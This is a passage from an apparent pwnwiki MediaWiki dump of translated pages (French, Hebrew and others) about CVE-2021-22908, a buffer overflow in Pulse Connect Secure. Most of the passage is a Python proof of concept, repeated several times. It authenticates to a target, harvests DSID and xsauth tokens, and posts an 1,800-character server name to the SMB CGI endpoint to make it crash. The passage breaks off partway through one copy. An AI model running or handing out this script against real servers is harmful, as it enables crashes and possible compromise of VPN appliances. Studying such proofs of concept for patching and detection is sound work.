    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== مرجع ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>h4apj1rm93v4wqs3k7a2goe44exxbeh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/fr</title>
    <ns>0</ns>
    <id>3443</id>
    <revision>
      <id>4008</id>
      <timestamp>2021-06-04T02:15:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Description de la vulnérabilité=="</comment>
      <origin>4008</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12357" sha1="269wnxd3bidtdxqihvh6xgqwwr2srla" xml:space="preserve">&lt;languages  /&gt;
==Description de la vulnérabilité==

Étant donné que PCS prend en charge la connexion au partage de fichiers Windows (SMB), la fonction est fournie par des scripts CGI basés sur les bibliothèques Samba 4.5.10 et les applications auxiliaires. Lors de la spécification d'un nom de serveur long pour certaines opérations SMB, l'application smbclt peut se bloquer en raison d'un dépassement de mémoire tampon, selon la longueur du nom de serveur spécifié.

Il a été confirmé que le système PCS 9.1R11.4 présente cette vulnérabilité. Le point de terminaison CGI cible est &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. D'autres points de terminaison CGI peuvent également déclencher cette vulnérabilité.

Si un attaquant ne parvient pas à nettoyer après avoir exploité avec succès cette vulnérabilité, la spécification d'un nom de serveur long peut entraîner les entrées de journal d'événements PCS suivantes :
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

Mais pour exploiter cette vulnérabilité, le serveur PCS doit avoir une politique d'accès aux fichiers Windows qui autorise \\* ou une autre politique qui permet à un attaquant de se connecter à n'importe quel serveur. Vous pouvez afficher la politique SMB actuelle en affichant Utilisateur-&gt;Politique de ressource-&gt;Politique d'accès aux fichiers Windows sur la page de gestion PCS. Les périphériques PCS 9.1R2 et antérieurs utilisent la politique par défaut d'autorisation des connexions à n'importe quel hôte SMB. À partir de la 9.1R3, cette politique a été modifiée de l'autorisation par défaut au rejet par défaut.

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響範圍==
&lt;/div&gt;
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>269wnxd3bidtdxqihvh6xgqwwr2srla</sha1>
    </revision>
    <revision>
      <id>4011</id>
      <parentid>4008</parentid>
      <timestamp>2021-06-04T02:16:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Si un attaquant ne parvient pas à nettoyer après avoir exploité avec succès cette vulnérabilité, la spécification d'un nom de serveur long peut entraîner les entrées..."</comment>
      <origin>4011</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12251" sha1="nq3zbzbrcnk0ioqjp4jik0uw32wl3vl" xml:space="preserve">&lt;languages  /&gt;
==Description de la vulnérabilité==

Étant donné que PCS prend en charge la connexion au partage de fichiers Windows (SMB), la fonction est fournie par des scripts CGI basés sur les bibliothèques Samba 4.5.10 et les applications auxiliaires. Lors de la spécification d'un nom de serveur long pour certaines opérations SMB, l'application smbclt peut se bloquer en raison d'un dépassement de mémoire tampon, selon la longueur du nom de serveur spécifié.

Il a été confirmé que le système PCS 9.1R11.4 présente cette vulnérabilité. Le point de terminaison CGI cible est &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. D'autres points de terminaison CGI peuvent également déclencher cette vulnérabilité.

Si un attaquant ne parvient pas à nettoyer après avoir exploité avec succès cette vulnérabilité, la spécification d'un nom de serveur long peut entraîner les entrées de journal d'événements PCS suivantes :
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

Mais pour exploiter cette vulnérabilité, le serveur PCS doit avoir une politique d'accès aux fichiers Windows qui autorise \\* ou une autre politique qui permet à un attaquant de se connecter à n'importe quel serveur. Vous pouvez afficher la politique SMB actuelle en affichant Utilisateur-&gt;Politique de ressource-&gt;Politique d'accès aux fichiers Windows sur la page de gestion PCS. Les périphériques PCS 9.1R2 et antérieurs utilisent la politique par défaut d'autorisation des connexions à n'importe quel hôte SMB. À partir de la 9.1R3, cette politique a été modifiée de l'autorisation par défaut au rejet par défaut.

==Périmètre d'influence==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

==Référence==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>nq3zbzbrcnk0ioqjp4jik0uw32wl3vl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>3426</id>
    <revision>
      <id>3991</id>
      <timestamp>2021-06-04T02:10:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== היקף ההשפעה =="</comment>
      <origin>3991</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12279" sha1="aq51tjgrmaxzj1tsu9or2y87pqp6w88" xml:space="preserve">&lt;languages  /&gt;
== תיאור פגיעות ==

מכיוון ש- PCS תומך בחיבור לשיתוף קבצים ב- Windows (SMB), הפונקציה ניתנת על ידי סקריפטים של CGI המבוססים על ספריות Samba 4.5.10 ויישומי עזר. בעת ציון שם שרת ארוך לפעולות SMB מסוימות, יישום smbclt עלול לקרוס עקב הצפת מאגר, תלוי באורך שם השרת שצוין.

אושר כי למערכת PCS 9.1R11.4 יש פגיעות זו. נקודת הקצה היעד של CGI היא &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. נקודות קצה אחרות של CGI עשויות גם לעורר פגיעות זו.

אם תוקף לא מצליח לנקות לאחר ניצול מוצלח של פגיעות זו, ציון שם שרת ארוך עלול לגרום לרישומי יומן האירועים הבאים של PCS:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

אך כדי לנצל את הפגיעות הזו, על שרת ה- PCS להיות בעל מדיניות גישה לקבצים של Windows המאפשרת \\ * או מדיניות אחרת המאפשרת לתוקף להתחבר לכל שרת. באפשרותך להציג את מדיניות ה- SMB הנוכחית על ידי הצגת משתמש-&gt; מדיניות משאבים-&gt; מדיניות גישה לקבצים של Windows בדף הניהול של PCS. 9.1R2 והתקני PCS קודמים משתמשים במדיניות ברירת המחדל של התרת חיבורים לכל מארח SMB. החל מ 9.1R3, מדיניות זו שונתה מהרשאת ברירת המחדל לדחיית ברירת המחדל.

== היקף ההשפעה ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
